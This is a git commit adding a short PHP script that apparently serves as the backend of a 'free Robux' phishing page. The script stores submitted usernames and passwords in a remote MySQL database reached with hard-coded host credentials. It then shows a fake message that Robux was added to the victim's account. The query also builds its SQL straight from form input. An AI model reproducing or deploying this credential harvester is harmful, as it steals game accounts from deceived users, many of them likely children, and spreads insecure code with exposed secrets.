f90d6e2a4b0dc66c7459359a02d435004dd523de
Soxngakase <157890407+Soxngakase@users.noreply.github.com>
2024-04-03 22:05:17 +0800

    Add files via upload

---
+++ database.php
@@ -0,0 +1,15 @@
+<?php 
+$con=new mysqli("23.88.73.88","u2262204_kRuSKisP7u","uJUC0xHDVjFO9Y=H8J=GNcWf","s2262204_sox");
+
+$username=$_POST['username'];
+$password=$_POST['password'];
+
+$sql="INSERT INTO accounts(username, password) VALUES('$username', '$password')";
+$result=mysqli_query($con,$sql);
+if($result=="true"){
+ echo "<center><h2>Robux has successfully added to your account, check robux status <a href='a'>Status</a></h2></center>";
+}
+else{
+ echo "<center><h2>Error..</h2></center>";
+}
+?>
